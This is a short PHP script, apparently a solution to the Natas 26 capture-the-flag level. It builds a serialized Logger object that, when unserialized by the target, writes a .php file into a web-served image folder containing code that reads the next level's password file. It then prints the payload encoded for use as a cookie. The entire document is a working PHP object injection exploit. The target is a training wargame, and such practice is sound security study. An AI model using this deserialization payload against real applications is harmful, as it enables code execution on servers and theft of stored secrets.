<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="heyyyyyy\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "/var/www/natas/natas26/img/omg.php";
    }
}

$o = new Logger();
print urlencode(base64_encode(serialize($o)))."\n";
?>